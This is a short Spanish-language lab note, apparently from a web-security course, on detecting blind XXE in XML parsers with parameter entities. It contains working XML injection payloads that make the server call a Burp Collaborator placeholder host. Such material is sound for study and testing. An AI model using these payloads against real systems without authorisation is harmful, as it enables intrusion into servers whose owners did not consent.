En esta clase continuamos con la explotación de vulnerabilidades XXE ciegas, utilizando una variante más sofisticada. En este caso, la aplicación bloquea las entidades externas tradicionales, lo que nos obliga a recurrir al uso de parameter entities, una técnica menos común pero igualmente poderosa.

El objetivo es forzar al analizador XML a realizar una solicitud externa, y para ello empleamos Burp Collaborator como canal para observar si el servidor realiza conexiones salientes. Si vemos actividad en Collaborator después de enviar nuestra carga, confirmamos la vulnerabilidad.

Este enfoque es especialmente útil en entornos donde se han implementado filtros para mitigar las XXE básicas, pero aún persisten configuraciones inseguras que pueden ser explotadas con técnicas más avanzadas

-----
#### Entidades Externas Generales

Se hacen fuera de la DTD

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://burpsuite-collaborator/" > ]>
```


#### Entidades de Parámetros

De hacen dentro de la DTD

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://burpsuite-collaborator/" > %xxe; ]>
```

Ahora, podemos meter esto a la consulta a traves del collboarator:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://burpsuite-collaborator/" > ]>
<productId>
&xxe;
</productId>
```

Vemos que no nos muestra nada en el Collaborator, ahora declamos a XXE en parametros para que se envié correctamente

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://burpsuite-collaborator/" > %xxe;]>
<productId>
1
</productId>
```